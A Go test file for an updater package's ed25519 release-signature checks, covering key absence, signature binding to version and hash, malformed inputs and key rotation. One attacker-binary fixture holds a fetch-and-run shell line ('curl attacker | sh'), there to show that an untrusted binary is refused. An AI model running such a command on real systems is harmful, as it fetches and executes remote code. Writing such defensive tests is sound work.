package updater

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
)

// withTrustedKey installs a key for the duration of one test. The production
// list is empty on purpose, so tests must supply their own.
func withTrustedKey(t *testing.T, pub ed25519.PublicKey) {
	t.Helper()
	saved := releasePublicKeys
	releasePublicKeys = []string{base64.StdEncoding.EncodeToString(pub)}
	t.Cleanup(func() { releasePublicKeys = saved })
}

func signRelease(t *testing.T, priv ed25519.PrivateKey, version, sum string) string {
	t.Helper()
	return base64.StdEncoding.EncodeToString(ed25519.Sign(priv, signaturePayload(version, sum)))
}

func hashOf(b []byte) string {
	s := sha256.Sum256(b)
	return hex.EncodeToString(s[:])
}

func newKey(t *testing.T) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("keygen: %v", err)
	}
	return pub, priv
}

// The state this ships in. An agent with no compiled-in key must refuse every
// update rather than fall back to the checksum-only path used before signing.
func TestNoCompiledKeyRefusesEverything(t *testing.T) {
	saved := releasePublicKeys
	releasePublicKeys = nil
	t.Cleanup(func() { releasePublicKeys = saved })

	err := VerifyRelease("v1.0.0", hashOf([]byte("x")), "AAAA")
	if err == nil {
		t.Fatal("verification passed with no trusted key; self-update would be unverified")
	}
	if !strings.Contains(err.Error(), "self-update is disabled") {
		t.Errorf("error should say the feature is off and how to switch it on, got: %v", err)
	}
}

func TestValidSignatureVerifies(t *testing.T) {
	pub, priv := newKey(t)
	withTrustedKey(t, pub)

	sum := hashOf([]byte("the real binary"))
	if err := VerifyRelease("v1.2.3", sum, signRelease(t, priv, "v1.2.3", sum)); err != nil {
		t.Fatalf("a correctly signed release was rejected: %v", err)
	}
}

// The original hole: the control plane picks both the URL and the hash, so it can
// present the hash of any binary it likes. Without a key it holds, the
// signature check must stop it.
func TestAttackerControlledBinaryWithMatchingHashIsRefused(t *testing.T) {
	pub, _ := newKey(t)
	withTrustedKey(t, pub) // the real release key

	_, attacker := newKey(t) // what a compromised control plane has: not the release key
	evil := []byte("#!/bin/sh\ncurl attacker | sh\n")
	sum := hashOf(evil) // an honest hash of a dishonest binary

	sig := signRelease(t, attacker, "v9.9.9", sum)
	if err := VerifyRelease("v9.9.9", sum, sig); err == nil {
		t.Fatal("a binary signed by a key we do not trust was accepted")
	}
}

// A signature is bound to one (version, hash) pair. Reusing it for a different
// artefact must fail, or the signature would authenticate nothing specific.
func TestSignatureDoesNotTransferToAnotherArtifact(t *testing.T) {
	pub, priv := newKey(t)
	withTrustedKey(t, pub)

	good := hashOf([]byte("release 1.2.3"))
	other := hashOf([]byte("some other build"))
	sig := signRelease(t, priv, "v1.2.3", good)

	if err := VerifyRelease("v1.2.3", other, sig); err == nil {
		t.Error("signature accepted for a different artefact")
	}
	if err := VerifyRelease("v1.2.4", good, sig); err == nil {
		t.Error("signature accepted for a different version; the version is not bound")
	}
}

func TestMalformedSignatureInputsAreRefused(t *testing.T) {
	pub, priv := newKey(t)
	withTrustedKey(t, pub)
	sum := hashOf([]byte("x"))
	good := signRelease(t, priv, "v1.0.0", sum)

	cases := []struct {
		name             string
		version, sum, sg string
	}{
		{"empty version", "", sum, good},
		{"short hash", "v1.0.0", "abc", good},
		{"non-hex hash", "v1.0.0", strings.Repeat("z", 64), good},
		{"signature not base64", "v1.0.0", sum, "!!!!"},
		{"signature wrong length", "v1.0.0", sum, base64.StdEncoding.EncodeToString([]byte("short"))},
		{"empty signature", "v1.0.0", sum, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := VerifyRelease(tc.version, tc.sum, tc.sg); err == nil {
				t.Error("accepted malformed input; verification must fail closed")
			}
		})
	}
}

// Rotation has to be possible without a flag day: a build trusting both keys
// accepts artefacts signed by either.
func TestRotationAcceptsEitherTrustedKey(t *testing.T) {
	oldPub, oldPriv := newKey(t)
	newPub, newPriv := newKey(t)
	saved := releasePublicKeys
	releasePublicKeys = []string{
		base64.StdEncoding.EncodeToString(oldPub),
		base64.StdEncoding.EncodeToString(newPub),
	}
	t.Cleanup(func() { releasePublicKeys = saved })

	sum := hashOf([]byte("binary"))
	for name, priv := range map[string]ed25519.PrivateKey{"old": oldPriv, "new": newPriv} {
		if err := VerifyRelease("v2.0.0", sum, signRelease(t, priv, "v2.0.0", sum)); err != nil {
			t.Errorf("%s key rejected during rotation: %v", name, err)
		}
	}
}

func TestGarbageInTrustedKeyListIsAnError(t *testing.T) {
	saved := releasePublicKeys
	t.Cleanup(func() { releasePublicKeys = saved })

	for _, bad := range []string{"not base64!!", base64.StdEncoding.EncodeToString([]byte("too short"))} {
		releasePublicKeys = []string{bad}
		if err := VerifyRelease("v1.0.0", hashOf([]byte("x")), "AAAA"); err == nil {
			t.Errorf("a malformed trusted key %q was tolerated", bad)
		}
	}
}
